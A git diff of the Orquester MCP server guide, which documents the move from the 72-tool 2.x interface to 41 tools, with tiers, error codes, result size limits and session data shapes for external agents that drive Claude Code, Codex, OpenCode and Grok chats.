@@ -8,25 +8,33 @@ A guide for an AI agent (or whoever configures one) to connect an MCP client to 
 ## 1. What it is
 
 The Orquester MCP lets an external agent — a Claude Code session, Claude Desktop, a script — do
-through `POST /mcp` what a person does in the chat GUI: open, resume, configure and close chat
-sessions of Claude Code, Codex, OpenCode and Grok; pick the
-model, effort, permission mode, plan mode and account; send messages with images or files and get
-the reply back in the same call; set, follow and pause an agent's own goal; answer the agent's
-questions and tool approvals; read status,
+through `POST /mcp` what a person does in the chat GUI: open, resume, configure, fork and close chat
+sessions of Claude Code, Codex, OpenCode and Grok; pick the model, effort, permission mode, plan mode
+and account; send messages with images or files and get the reply back in the same call; set,
+follow and pause an agent's own goal; answer the agent's questions and tool approvals; read status,
 transcripts, a tool call's whole output, subagents and per-turn diffs; search the text of every
-chat; wait until a session needs attention; and read quota and estimated cost. The shared todo lists
-and sandboxed file reads are there too. That is **31 tools** (§6) — plus **13 automated-workflow
-tools** that build, edit, run and inspect the daemon's n8n-like workflows (§12), and **13
-agent-profile tools** that manage each agent CLI's own global MCP servers, skills, plugins,
-marketplaces, hooks, commands and instruction file (§13), and **9 desktop tools** that open
-desktop tabs — Linux GUI apps on a virtual display on the daemon's host — launch apps in them and
-manage their windows (§14): 66 in all.
+chat; wait until a session needs attention; read quota, cost and one session's token usage; push a
+notification to the user's devices; read files and a project's git state; keep the shared todo lists
+and the saved-prompt library; build, edit, run and debug the daemon's automated workflows (§12);
+manage each agent CLI's own global MCP servers, skills, plugins, marketplaces, hooks, commands and
+instruction file (§13); and open desktop tabs — Linux GUI apps on a virtual display on the daemon's
+host (§14). That is **41 tools** (server version 3.0.0; §6 lists them, and opens with the migration
+from the 72-tool 2.x surface).
 
-Apart from the todo and file tools, which use the daemon's todo store and its sandboxed file
-reader directly, the tools are a thin in-process client of the daemon's own REST API: every call
-goes through the routes the GUI uses, with the same gates and the same error codes, plus a few
-stricter checks of the MCP's own (§10). There is **no terminal I/O** — no screen reads, no
-keystrokes, no TUI prompt handling. Terminal tabs are listed and can be closed, nothing more.
+**One catalog, two audiences.** The same tool definitions also serve the agents chatting *inside*
+Orquester (the in-chat `orquester` server, `apps/daemon/src/session-tools/README.md`), which get
+these 41 tools plus four chat-only ones (`html_preview`, `html_render`, `request_secret`,
+`request_toolset`). Every tool has a **tier** — Read, Act or Admin — and a **toolset**; in a chat
+they decide what runs without asking, what needs the user's approval card and what is advertised at
+all. **An external client is full trust:** for you the tier is information only (`_meta` on every
+`tools/list` entry, §6), no card is ever raised, and no tool is hidden. A few arguments exist for
+one audience only: the chat-only ones (`create_session.delegate`, `reply: "notify"`, the workflow
+tools' `reason`) are refused here with `INVALID_ARGUMENT`.
+
+Every tool is a thin in-process client of the daemon's own REST API: every call goes through the
+routes the GUI uses, with the same gates and the same error codes, plus a few stricter checks of the
+MCP's own (§10). There is **no terminal I/O** — no screen reads, no keystrokes, no TUI prompt
+handling. Terminal tabs are listed and can be closed, nothing more.
 
 ---
 
@@ -51,7 +59,7 @@ Endpoint summary:
 | Required request header | `Accept: application/json, text/event-stream` (MCP client libs set this automatically) |
 | Auth | `Authorization: Bearer <credential>` (see §3) |
 | Request body | At most 16 MiB (room for inline base64 attachments, §9) |
-| Server | `orquester` 2.0.0, with a short `instructions` block for the driving model |
+| Server | `orquester` 3.0.0, with a short `instructions` block for the driving model (≤ 2 KB) |
 
 ---
 
@@ -102,13 +110,20 @@ node compute-bearer.mjs https://your-domain.com admin 'your-password'
 
 Replace `<URL>` with your endpoint and `<CREDENTIAL>` with the `base64(...)` value from §3.
 
-> **Not the chat agents' `orquester` server.** Every agent chatting inside Orquester already gets a
-> separate, thread-scoped MCP server also named `orquester` (session tools,
-> `apps/daemon/src/session-tools/README.md`); this endpoint is for agents and clients *outside*
-> Orquester. If you install it into a CLI whose chats you also run inside Orquester, give it another
-> name — `orquester_remote` (underscore) — so neither shadows the other there. Avoid names starting
-> with `orquester-` (hyphen): OpenCode chats hide the per-thread session-tool servers by that
-> prefix. Orquester pre-approves only its own session tools, by name, never this server's tools.
+> **For agents outside Orquester.** Every agent chatting inside Orquester already gets its own
+> thread-scoped server, also named `orquester`, with this catalog under tiers, toolsets and approval
+> cards (`apps/daemon/src/session-tools/README.md`). **Orquester disables this server inside the
+> chats it launches**, whatever you name it and wherever you install it (user scope, a managed
+> account's home, a project's `.mcp.json`, `.codex/config.toml`, `opencode.json` or Grok's project
+> config): a server whose headers carry a bearer this daemon accepts, or whose URL is this daemon's
+> `/mcp`, is denied in every Orquester chat — Claude: `disallowedTools` and `deniedMcpServers` (it
+> never connects); Codex: `mcp_servers.<name>.enabled = false` in the thread's config; Grok: a
+> same-named inert entry that shadows it; OpenCode: a session-ruleset deny — so a chat can never
+> reach full trust around its cards. The agent-profile panel marks such a server "Disabled inside
+> Orquester chats". Still give it another name than `orquester` — `orquester_remote` (underscore):
+> a server of yours named exactly `orquester` is always denied in Claude chats and replaced by
+> Orquester's own in Codex and Grok chats. Avoid names starting with `orquester-` (hyphen): OpenCode
+> chats hide the per-thread servers by that prefix.
 
 ### Claude Code (CLI)
 
@@ -176,16 +191,17 @@ Every tool names things the same way:
   `workspace`/`name` are `null` for a path that is not `<workspaces>/<workspace>/<project>`.
 - **An agent** is a registry id — `claude`, `codex`, `opencode`, `grok` —
   as `list_agents` lists them for this host.
-- **A pending question or approval** is `requestId` (from `get_session`). It may be omitted when
-  exactly one request of that kind is pending. An empty `requestId` is refused (`INVALID_ARGUMENT`),
-  never read as omitted.
+- **A pending question or approval** is `requestId` (from `get_session`; `respond_to_request` answers
+  it). It may be omitted when exactly one request of that kind is pending. An empty `requestId` is
+  refused (`INVALID_ARGUMENT`), never read as omitted.
 - **A turn** is a 1-based number counting the session's started turns in order; `turnCount` is the
-  highest. `get_turn_diff`, `read_transcript`, `revert_session` and a `search_sessions` hit's
-  `turn` all count this way.
+  highest. `get_turn_diff`, `read_transcript`, `fork_session`'s `throughTurn`, `control_session
+  {action: "rewind", keepTurns}` and a `search_sessions` hit's `turn` all count this way.
 - **A tool call's whole output** is `itemId`: a tool row's `outputItemId` from `read_transcript`
   (§6, Tool output).
-- **A subagent** is `agentId` (from `get_session`'s `subagents`), **a todo list** is `id`, and **a
-  file** is `path` (absolute, or relative to the sandbox root).
+- **A subagent** is `agentId` (from `get_session`'s `subagents`), **a todo list** is `id`, **a
+  saved prompt** is `id`, **a workflow** is `workflowId` and a run `runId`, **an agent-profile item**
+  is `itemId`, and **a file** is `path` (absolute, or relative to the sandbox root).
 
 Values several tools share:
 
@@ -212,23 +228,110 @@ Values several tools share:
 
 ## 6. The tools
 
+### Migrating from the 72-tool surface
+
+Server 3.0.0 replaces the 2.x surface: tools that did one thing in several ways are merged, and
+`timeoutMs` became `timeoutSeconds` everywhere. This server keeps no aliases for 2.x names: a
+client holding the old tool list gets JSON-RPC `-32602` (`Tool … not found`) for a removed name —
+reconnect for the new list (§11). (Aliases exist only on the in-chat side, for the 16 tool names an
+agent host from before 3.0.0 still advertises during a deploy's handover; they and their removal
+criterion are in `apps/daemon/src/session-tools/README.md`.)
+
+| Old (2.x) | New (3.0.0) |
+|---|---|
+| `list_projects`, `list_agents`, `list_conversations`, `list_sessions`, `get_session`, `get_turn_diff`, `read_transcript`, `read_tool_output`, `search_sessions`, `create_session`, `update_session`, `fork_session`, `merge_back_session`, `wait_for_session`, `list_todos`, `list_workflow_block_types`, `list_workflows`, `get_workflow`, `create_workflow`, `update_workflow`, `delete_workflow`, `preview_expression`, `run_workflow`, `cancel_workflow_run`, `list_workflow_secrets`, `set_workflow_secret`, `get_agent_profile`, `read_file` | same name (input changes below) |
+| `interrupt_session` / `stop_task` / `stop_session` / `close_session` / `compact_session` / `revert_session {keepTurns}` | `control_session {action: "interrupt" \| "stop_task" \| "stop_process" \| "close" \| "compact" \| "rewind"}` (`taskId`, `keepTurns` as before) |
+| `get_session_lineage` | `get_session` (`lineage`, `pendingDeliveries`) |
+| `resolve_merge_back {sessionId, mergeId, action}` | `merge_back_session {sessionId, mergeId, action}` |
+| `send_message {wait, timeoutMs}` | `send_message {reply: "wait" \| "none", timeoutSeconds}`; with `reply: "wait"` a working session gets the message as its **next turn** instead of a steer (§8) |
+| `implement_plan` | `send_message {implementPlan: true}` |
+| `answer_question` / `dismiss_question` / `resolve_approval` | `respond_to_request {answers}` / `{dismiss: true}` / `{decision}` |
+| `wait_for_session {timeoutMs}` | `{timeoutSeconds}`; `sessionIds` added |
+| `get_cost {days}` | `get_usage {include: ["cost"], days, bucket}` |
+| `list_files` | `read_file` on a directory |
+| `create_todo` / `update_todo` / `delete_todo` / `toggle_todo_item` | `update_todos {action: "create" \| "update" \| "delete" \| "toggle"}` |
+| `validate_workflow` | `create_workflow` / `update_workflow` `{dryRun: true}` |
+| `run_workflow {workflowId}` | `run_workflow {workflowId, revision}` (refused if the workflow changed since that revision) |
+| `list_workflow_runs` / `get_workflow_run` | `get_workflow_runs {workflowId}` / `{runId}` |
+| `list_agent_profiles`, `get_agent_profile_item`, `get_agent_instructions`, `list_marketplace_plugins` | `get_agent_profile {}` / `{agent, itemId}` / `{agent, instructions: true}` / `{agent, marketplace}` |
+| the 8 agent-profile writes | `edit_agent_profile {agent, changes: [{action, …}]}` (≤ 10 per call) |
+| `desktops_list`, `desktop_host_status`, `desktop_windows`, `desktop_app_log` | `get_desktops` (`{host: true}`, `{desktopId}`, `{desktopId, appId}`) |
+| `desktop_open`, `desktop_launch_app`, `desktop_stop_app`, `desktop_close`, `desktop_window_action {close}` | `control_desktop {action}`; `activate` and `maximize` are gone (the user does that in the tab) |
+| — | new: `create_session {prompt, reply}`, `notify_user`, `get_git_state`, `list_saved_prompts`, `update_saved_prompts` |
+
+Other input changes: `list_agents` adds `query` and `includeLegacy` (`includeLegacyModels` is still
+read); `list_sessions` adds `limit`; desktop tools take `project` where they took `projectPath`.
+`create_session` accepts a legacy model when named (the result says `isLegacy: true`) and reports
+the account it got with `accountSource`.
+
+### The 41 tools
+
+`tools/list` gives every tool a title, annotations, a description of every parameter and
+`_meta: {"orquester/tier", "orquester/toolset"}`. The tier and toolset are what an in-chat agent
+meets (§1): **Read** runs freely; **Act** runs freely within the chat's own project and permission
+mode; **Admin** always waits for the user's approval card in a chat. A tier that depends on the
+call is listed by its widest (`admin` in `_meta`). For you, every tool simply runs.
+
+<!-- external-tools:begin -->
+| Tool | Toolset | Chat tier | What it does |
+|---|---|---|---|
+| `list_projects` | core | Read | Workspaces and projects: paths, recency, open sessions, `repoId`, each workspace's git account |
+| `list_agents` | core | Read | The composer's picker: agents, models, options, permission modes, capabilities, accounts |
+| `list_conversations` | chat-extras | Read | A project's resumable provider conversations |
+| `list_sessions` | core | Read | Open tabs: status, attention and why, lineage |
+| `get_session` | core | Read | One session: settings, pending requests, plan, subagents, context, last reply, lineage, pending deliveries |
+| `read_transcript` | core | Read | Turns, tool calls, plans, file changes; a subagent's drill-in; older history |
+| `get_turn_diff` | chat-extras | Read | A turn's unified diff |
+| `update_session` | chat-extras | Act | Title, model, options, permission mode, account |
+| `control_session` | core | Act | `interrupt`, `stop_task`, `stop_process`, `compact`, `rewind`, `close` |
+| `fork_session` | core | Act | Fork a chat through a turn or at a message |
+| `merge_back_session` | core | Act | A fork's result to its parent; deliver or discard a queued delivery |
+| `search_sessions` | core | Read | Full-text search over chats |
+| `create_session` | core | Act | Open or resume a chat, optionally with its first prompt |
+| `send_message` | core | Act | Send a message (`reply` wait / none), plan mode, Implement, `/goal` |
+| `read_tool_output` | chat-extras | Read | A tool call's whole output, paged |
+| `respond_to_request` | chat-extras | Act | Answer or dismiss an agent's question; decide a tool approval |
+| `wait_for_session` | core | Read | Block until a session needs attention (cursor) |
+| `get_usage` | core | Read | Quota, cost by day or week, one session's tokens and cost |
+| `notify_user` | chat-extras | Act | A Web Push to the user's devices |
+| `read_file` | files-git | Read | A file (paged) or a directory listing, in the sandbox |
+| `get_git_state` | files-git | Read | A project's git status, branches, log or working diff |
+| `list_todos` | notes | Read | The shared todo lists of a workspace or project |
+| `update_todos` | notes | Act | Create, update, toggle or delete a todo list |
+| `list_saved_prompts` | reads | Read | The saved-prompt library: global and a project's |
+| `update_saved_prompts` | notes | Act; Admin for a user-made or workflow-used prompt | Create, edit, pin or delete a saved prompt |
+| `list_workflow_block_types` | workflow-authoring | Read | Block contracts, the expression and authoring guides |
+| `list_workflows` | reads | Read | A project's workflows: enabled, triggers, last run, problems |
+| `get_workflow` | reads | Read | One workflow's definition, revision and problems |
+| `create_workflow` | workflow-authoring | Admin (`dryRun`: Read) | Create a workflow, or validate one |
+| `update_workflow` | workflow-authoring | Admin (`dryRun`: Read) | Patch a workflow (ops), or validate the patch |
+| `delete_workflow` | workflow-authoring | Admin | Delete a workflow with its runs and own secrets |
+| `preview_expression` | workflow-authoring | Read | Render `{{ }}` templates against recorded data |
+| `run_workflow` | workflow-authoring | Admin | A manual run of a pinned revision, optionally waited on |
+| `get_workflow_runs` | reads | Read | Runs, one run's blocks, a block's whole output or log |
+| `cancel_workflow_run` | workflow-authoring | Act | Cancel an active run |
+| `list_workflow_secrets` | workflow-authoring | Read | Workflow secret names |
+| `set_workflow_secret` | workflow-authoring | Admin | Set or delete a workflow secret |
+| `get_agent_profile` | reads | Read | Agent CLIs' global config: summary, items, one item, instruction file, a marketplace's plugins |
+| `edit_agent_profile` | agent-profile-editing | Admin | Up to 10 agent-profile changes in one call |
+| `get_desktops` | desktops | Read | Desktop tabs, their apps and windows, an app's log, the host's readiness |
+| `control_desktop` | desktops | Admin for `open` / `launch_app`; Act otherwise | Open a desktop, launch, stop or close apps and windows, close it |
+<!-- external-tools:end -->
+
+### Results and errors
+
 Inputs marked `?` are optional; `= x` is the default. Every successful result is **one JSON
 object**, returned as `structuredContent` and as the same JSON in a single text block
 (`content[0].text`); lists are wrapped (`{"sessions": [...]}`). A tool that changes a session
 returns the session's fresh `SessionDetail` under `session`, so you see the effect without a second
-call (`close_session` aside: the tab is gone). The tools that send the agent a command also return
-the host's `seq`; `create_session` and `update_session` do not — `update_session` returns the
-fields it `applied` instead. `tools/list` gives every tool a title, annotations and a description
-of every parameter. The annotations: `readOnlyHint` on every tool that only reads or waits — the
-`list_*`, `get_*` and `read_*` tools, `search_sessions` and `wait_for_session`; `destructiveHint`
-on `close_session`, `revert_session` and `delete_todo`; `idempotentHint` on every tool but
-`create_session`, `interrupt_session` (a retry after the turn has stopped goes on to stop the
-background work), `compact_session` (a retry compacts again), `fork_session` and
-`merge_back_session` (a new call forks, or merges, again; each call's own retries reuse its command id),
-`resolve_merge_back`, `send_message`, `implement_plan`,
-the three request tools, `create_todo` and `toggle_todo_item`; `openWorldHint: false` on reads,
-waits, usage and the todo and file tools, which touch only the daemon's own state (a tool that
-drives an agent keeps the default).
+call (`control_session {action: "close"}` aside: the tab is gone). The tools that send the agent a
+command also return the host's `seq`; `update_session` returns the fields it `applied` instead.
+The annotations describe the most dangerous thing a tool can do: `readOnlyHint` on every tool that
+only reads or waits; `destructiveHint` on `control_session` (close, rewind), `update_todos`,
+`update_saved_prompts`, `delete_workflow`, `set_workflow_secret`, `edit_agent_profile` and
+`control_desktop`; `openWorldHint: false` on every read and on `update_todos` and
+`update_saved_prompts`, which touch only the daemon's own state (a tool that drives an agent keeps
+the default).
 
 **Errors** come back as `isError: true` with the text `<CODE>: <message>` and
 `structuredContent: {code, message, detail?}`; the message names the valid values or the tool that
@@ -241,12 +344,14 @@ fixes the problem. The codes include:
   `NOT_FOUND`, 409 `COMMAND_REJECTED`, 413 `UPLOAD_TOO_LARGE`, 429 `TOO_MANY_ATTEMPTS`, 502/503
   `HOST_UNAVAILABLE`, any other 4xx `INVALID_ARGUMENT`, any other 5xx `INTERNAL`.
 - **The MCP's own codes**: `INVALID_ARGUMENT`, `PROJECT_NOT_FOUND`, `SESSION_NOT_FOUND`,
-  `NOT_A_CHAT_SESSION`, `PENDING_REQUEST`, `SESSION_BUSY`, `PATH_NOT_ALLOWED` and `INTERNAL`.
-  `INTERNAL` never carries a path or a stack (the detail is logged on the daemon).
-  `read_tool_output` answers `NOT_FOUND` for an item the host does not have, whatever code the
-  host gave.
-- **The todo store's codes**: `NOT_FOUND`, a todo list id that does not exist, whose message names
-  it (`No todo list with id "<id>"; list_todos shows the ids.`), and `CONFLICT`, the store's 409.
+  `NOT_A_CHAT_SESSION`, `PENDING_REQUEST`, `SESSION_BUSY`, `PATH_NOT_ALLOWED`, `CANCELLED` and
+  `INTERNAL`. `INTERNAL` never carries a path or a stack (the detail is logged on the daemon).
+  `read_tool_output` answers `NOT_FOUND` for an item the host does not have, whatever code the host
+  gave. The approval codes (`APPROVAL_DENIED`, `APPROVAL_TIMEOUT`, `PREVIEW_STALE`,
+  `TOOL_NOT_ENABLED`, `EXCHANGE_LIMIT`, …) are the in-chat audience's: an external call never meets
+  a card.
+- **The stores' codes**: the todo store's `NOT_FOUND` (`No todo list with id "<id>"; list_todos
+  shows the ids.`) and `CONFLICT`; the workflow, agent-profile and desktop codes of §12–§14.
 
 An argument the tool's schema refuses gets the same envelope: `INVALID_ARGUMENT` with one line,
 `Invalid arguments for <tool>: <field>: <reason>; …`. It names at most five bad fields, each in at
@@ -254,37 +359,35 @@ most 200 characters, so a huge value zod echoes back (an enum's value, an unknow
 key) is cut with "…". A call with no `arguments` object takes the defaults. An argument name the
 tool does not have is refused, never dropped: `INVALID_ARGUMENT` names it
 (`arguments: Unrecognized key(s) in object: 'planmode'`), so a misspelled optional argument cannot
-silently take its default. `tools/list` has the exact names, and every tool's `inputSchema` says
-`additionalProperties: false`. Nested, an attachment object refuses an unknown key too, while
-`create_session`'s `resume` object still drops one (its one field, `conversationId`, is required).
-An unknown tool name is not a tool result but a JSON-RPC error, code `-32602`
-(`MCP error -32602: Tool <name> not found`). A refusal quotes a todo list id, a todo item, a model
-slug or an unknown tool's name cut to 100 characters (a todo quote is JSON-escaped, so a control
-character in it takes six), and a todo refusal lists at most 40 of the list's items, each cut to
-70 characters. No error message is longer than 4 000 characters: a longer one is cut, ending in
-"…". A command the agent host refuses with `HOST_UNAVAILABLE` (it is restarting) is retried with
-the same command id up to 3 times (250 ms · 2ⁿ) before the error reaches you.
+silently take its default — and a chat-only argument (`delegate`, `reply: "notify"`, a workflow
+tool's `reason`) is refused the same way. `tools/list` has the exact names, and every tool's
+`inputSchema` says `additionalProperties: false`. An unknown tool name is not a tool result but a
+JSON-RPC error, code `-32602` (`MCP error -32602: Tool <name> not found`). A refusal quotes a value
+of yours (a todo list id, a model slug, an unknown tool's name) cut to 100 characters. No error
+message is longer than 4 000 characters: a longer one is cut, ending in "…". A command the agent
+host refuses with `HOST_UNAVAILABLE` (it is restarting) is retried with the same command id up to 3
+times (250 ms · 2ⁿ) before the error reaches you.
 
 **Size.** A result is at most 60 000 bytes of UTF-8 JSON (clients such as Claude Code drop larger
-MCP results). The tools that could return more bound themselves and say so:
-`read_transcript` (to `maxChars`; `truncated`), `list_agents` (the options of non-default models,
-then whole non-default models, largest catalogue first; `optionsOmitted`, `modelsTruncated`,
-`modelCount`), `list_conversations` (the oldest rows; `truncated`, `omitted`), `search_sessions`
-(the lowest-ranked hits, once each hit's title and snippet are cut to 300 characters; `truncated`,
-`omittedHits`), every session detail (its subagent rows, settled ones first; `subagentsTruncated`),
-`get_turn_diff` (the diff is cut at the end, `truncated`; a long file list keeps its head,
-`filesTruncated`, `omittedFiles`), `get_cost` (whole days of rows, oldest first; `truncated`,
-`rowsDropped`), `read_file` (the window shrinks; `truncated`, `nextOffset`), `read_tool_output`
-(the window shrinks; `nextOffset`), `list_files` (at most 500 entries, fewer when one result
-cannot hold them; `truncated`), `list_todos` (the oldest lists,
-counted by `omittedLists`; a newest list too big on its own is cut, marked `bodyTruncated`) and the
-todo writes (a body too big for one result comes back as its head, marked `bodyTruncated`). Long
-texts inside a session view — the plan, the last reply — are capped at 16 384 characters, and a
-subagent's title, progress and error at 200. The plan and the last reply are also cut by bytes
-when a session result would pass the cap. The reply goes first, then the plan, each cut on a
-character boundary and only as far as needed, with its `truncated` flag set (`replyTruncated` for
-`send_message`'s `reply`). As a last resort, a result still too large is cut: its text keeps the
-leading bytes (never splitting a character) and ends with
+MCP results). The tools that could return more bound themselves and say so: `read_transcript` (to
+`maxChars`; `truncated`), `list_agents` (the options of non-default models, then whole non-default
+models, largest catalogue first; `optionsOmitted`, `modelsTruncated`, `modelCount`),
+`list_conversations` (the oldest rows; `truncated`, `omitted`), `search_sessions` (the lowest-ranked
+hits, once each hit's title and snippet are cut to 300 characters; `truncated`, `omittedHits`),
+every session detail (its subagent rows, settled ones first; `subagentsTruncated`), `get_session`'s
+lineage (at most 50 children, `childrenOmitted`), `get_turn_diff` (the diff is cut at the end,
+`truncated`; a long file list keeps its head, `filesTruncated`, `omittedFiles`), `get_usage`'s
+cost (whole buckets of rows, oldest first; `truncated`, `rowsDropped`), `read_file` (the window
+shrinks; `truncated`, `nextOffset`; a directory: at most 500 entries, `truncated`),
+`get_git_state` (cut to fit, `truncated`), `read_tool_output` (the window shrinks; `nextOffset`),
+`list_todos` (the oldest lists, counted by `omittedLists`; a newest list too big on its own is cut,
+marked `bodyTruncated`) and the todo writes (a body too big for one result comes back as its head,
+marked `bodyTruncated`). Long texts inside a session view — the plan, the last reply — are capped at
+16 384 characters, and a subagent's title, progress and error at 200. The plan and the last reply
+are also cut by bytes when a session result would pass the cap. The reply goes first, then the
+plan, each cut on a character boundary and only as far as needed, with its `truncated` flag set
+(`replyTruncated` for `send_message`'s `reply`). As a last resort, a result still too large is cut:
+its text keeps the leading bytes (never splitting a character) and ends with
 `… [truncated: N bytes over the 60 000-byte cap]`, and its `structuredContent` is only
 `{truncated: true, truncationNote}`.
 
@@ -311,7 +414,7 @@ Tools that return a session return one of these two shapes.
            planReady: boolean, backgroundLiveness: "working" | "monitoring" | null,
            goal: { objective /* ≤ 200 characters */, status, continuing: boolean, heldForUpdate?: true } | null },
   terminal?: { status: "running" | "exited", exitCode?, legacyAgent? },
-  lineage?: { parentSessionId, relation: "fork" | "delegate", forkedFromTurnId? }   // a chat forked or delegated from another
+  lineage?: { parentSessionId, relation: "fork" | "delegate" | "opened", forkedFromTurnId? }   // a chat forked, delegated or opened from another
 }
 ```
 
@@ -328,14 +431,14 @@ starts the goal's turns by itself (Codex): the tab reads `working`, `reason: "go
 even between two of its turns. `heldForUpdate: true` — beside `status: "paused"` and
 `continuing: true` — means an Orquester update paused the goal between two of its turns so the
 agent host could restart, and the host sets it going again by itself once it has: there is nothing
-to resume, and the tab keeps reading `working`. Any `/goal` but `/goal status`, `interrupt_session`
-or `stop_session` takes the goal back from the update — nothing resumes it by itself then — and the
+to resume, and the tab keeps reading `working`. Any `/goal` but `/goal status`, or a
+`control_session` `interrupt` or `stop_process`, takes the goal back from the update — nothing resumes it by itself then — and the
 command does what it says: `/goal pause` keeps it paused, `/goal resume` sets it going again (and
 the update waits for it). `status`, `reason`, `continuing` and `heldForUpdate` come from the
 daemon's poll of the agent host, so they can trail a command by up to 1.5 s.
 
-`SessionDetail` — `get_session`, and every tool that changes a session — is the `SessionView`
-plus:
+`SessionDetail` — `get_session`'s `session`, and every tool that changes a session — is the
+`SessionView` plus:
 
 ```
 chat: { …SessionView.chat,
@@ -400,11 +503,12 @@ A terminal tab's `get_session` is just its `SessionView`: there is no transcript
 ```
 { id: <agent id>, name, adapter, enabled, installed, version, status: "ready" | "degraded" | "error" | "unknown", message?,
   auth: { status: "authenticated" | "unauthenticated" | "unknown", label?, email? },
-  models: [{ slug, name, shortName?, isDefault, isLegacy?,
+  models: [{ slug, name, shortName?, subProvider?, isDefault, isLegacy?,
              options: [{ id, label, type: "select" | "boolean", description?,
                          values?: [{ id, label, description?, isDefault? }] }] }],
              /* shed to fit the result: optionsOmitted: true in place of options */
   modelsTruncated?, modelCount?,                      // only when models were left out to fit
+  defaultModel?, catalogueLoading?,                   // what a launch naming no model gets; models still being probed
   effortOptionId,                                     // "effort" | "variant" | "reasoningEffort"
   runtimeModes: ["approval-required", "auto-accept-edits", "auto", "full-access"], defaultRuntimeMode: "full-access",
   supports: { planMode, rollback, compaction, backgroundTasks, taskStop, contextWindow,
@@ -416,7 +520,7 @@ A terminal tab's `get_session` is just its `SessionView`: there is no transcript
 `enabled` means the agent can be opened on this host (`create_session` needs it): its CLI was
 found. `models: []` means the catalogue is still being probed — retry shortly. `auth.status: "unknown"` is
 not a sign-in problem; only `"unauthenticated"` is. `supports.goals` is how the agent's own goals
-work: `command: "host"` (Codex) — Orquester runs `/goal` itself (§6 Messages) — or `"provider"`
+work: `command: "host"` (Codex) — Orquester runs `/goal` itself (§6 Conversation) — or `"provider"`
 (Claude, Grok) — `/goal` is the CLI's own; `actions` are what the GUI's goal chip offers;
 `continuesAcrossTurns` means the agent starts a goal's turns by itself. `null`: no goals (OpenCode). The list fits one result. Over it, the
 non-default models of the largest catalogues first lose their `options` (then marked
@@ -424,29 +528,48 @@ non-default models of the largest catalogues first lose their `options` (then ma
 largest catalogue first (`modelsTruncated: true`, `modelCount` = all of them). An agent's header
 and its default model (the flagged one, else the first) are never shed.
 
+`get_session` returns `{session: SessionDetail, lineage, pendingDeliveries, result?}`:
+
+- **`lineage`** — the session's own link (`relation`, `forkedFrom?`, `createdAt`, `agentCreated?`,
+  `delegationDepth?`), `parent: {sessionId, title, exists}` (`exists: false` once that tab is
+  closed) and `children` (oldest first, at most 50: `childrenOmitted` counts the rest), each with
+  `relation`, `createdAt`, `forkedFrom?`, `chatSessionStatus?` and `latestTurnState?`. `relation` is
+  `fork` (the GUI's "Fork from here", or `fork_session`), `delegate` (a task an in-chat agent handed
+  off) or `opened` (a chat an in-chat agent opened).
+- **`pendingDeliveries`** — messages queued for or from this session that their receiver has not
+  taken yet, `{kind?: "merge" | "reply" | "message", mergeId, parentSessionId, childSessionId,
+  queuedAt, state: "queued" | "failed", preview, attempts, error?}` — a fork's merge-back, another
+  chat's reply, or a message waiting for this busy chat's next idle point (`preview`: the first
+  200 characters; `parentSessionId` receives it). `merge_back_session {sessionId, mergeId, action}` delivers or discards one.
+- **`result`** — a delegated task's final reply once its turn settled (it is then left out of
+  `session.lastReply`).
+
 ### Catalogue
 
 | Tool | Input | Returns | GUI equivalent |
 |---|---|---|---|
-| `list_projects` | `workspace?`, `includeArchived? = false` | `{projects: [{workspace, name, path, isArchived, lastInteractedAt?, openSessions}], warnings?}` | The sidebar's workspaces and projects; the recent-projects list |
-| `list_agents` | `agent?`, `model?` (with `agent`), `includeLegacyModels? = false` | `{agents: AgentView[]}` — with `model`, that agent alone, `models` holding just that model | The `+` menu and the composer's model, effort, permission and account chips |
+| `list_projects` | `workspace?`, `query?`, `includeArchived? = false` | `{projects: [{workspace, name, path, isArchived, lastInteractedAt?, openSessions, repoId?}], workspaces: [{name, isArchived?, gitAccount: {label, login, provider} \| null}], warnings?}` | The sidebar's workspaces and projects; the recent-projects list |
+| `list_agents` | `agent?`, `model?` (with `agent`), `query?`, `includeLegacy? = false` | `{agents: AgentView[]}` — with `model`, that agent alone, `models` holding just that model | The `+` menu and the composer's model, effort, permission and account chips |
 | `list_conversations` | `project`, `agent?`, `limit? = 20` (≤ 200) | `{conversations: [{id, agent, title, preview?, updatedAt, home, accountId?, resumable}], truncated?, omitted?}` | The project's conversation history (resume picker) |
 
 - **`list_projects`** — recently used projects first, then the rest alphabetically; `openSessions`
   counts the project's open tabs. Archived workspaces and projects appear only with
-  `includeArchived: true`. An unknown or empty `workspace` is refused (`INVALID_ARGUMENT`; an
-  unknown one names the workspaces). `warnings` appears only when there is something to say: a
-  workspace whose projects cannot be read is left out and named there rather than failing the
-  whole list, and naming an archived workspace without `includeArchived` says why the list is
-  empty.
-- **`list_agents`** — every agent that opens as a chat tab, enabled or not (`enabled`).
-  Call it before `create_session` and `update_session`: it has every valid model,
-  option value, permission mode and account. `list_agents {agent, model}` gives one model with its
-  full options — a legacy one too, without `includeLegacyModels`, though a legacy model serves only
-  an existing session: `create_session` refuses it and `update_session` takes it — which is how to
-  read options a shortened list omits. An unknown or empty `agent` or `model` is refused
-  (`INVALID_ARGUMENT`), as is `model` without `agent`; while the catalogue is still being probed,
-  `model` answers "Still loading … models".
+  `includeArchived: true`. `query` keeps the projects whose `workspace/name` contains it. Sibling
+  clones of one repository share a `repoId`, and `workspaces` names each workspace's git account
+  (label, login, provider — never a key or token): a session created in a project runs with its
+  workspace's identity. An unknown or empty `workspace` is refused (`INVALID_ARGUMENT`; an unknown
+  one names the workspaces). `warnings` appears only when there is something to say: a workspace
+  whose projects cannot be read is left out and named there rather than failing the whole list,
+  and naming an archived workspace without `includeArchived` says why the list is empty.
+- **`list_agents`** — the composer's model picker, agent by agent, enabled or not (`enabled`).
+  Call it before `create_session` and `update_session`: it has every valid model, option value,
+  permission mode and account, and `isDefault` marks what a launch naming no model gets. `query`
+  matches a model's slug, name, short name or sub-provider. `list_agents {agent, model}` gives one
+  model with its full options — which is how to read options a shortened list omits. Legacy models
+  are listed only with `includeLegacy` (marked `isLegacy`); a legacy model named explicitly is
+  still accepted by `create_session` and `update_session`, never chosen by default. An unknown or
+  empty `agent` or `model` is refused (`INVALID_ARGUMENT`), as is `model` without `agent`; while
+  the catalogue is still being probed, `model` answers "Still loading … models".
 - **`list_conversations`** — the conversations the agent CLIs recorded on disk for this project,
   newest first. `agent` is the agent that resumes the row, and only `resumable: true` rows can be
   passed to `create_session`'s `resume`. A row whose agent is disabled is listed with
@@ -461,21 +584,11 @@ and its default model (the flagged one, else the first) are never shed.
 
 | Tool | Input | Returns | GUI equivalent |
 |---|---|---|---|
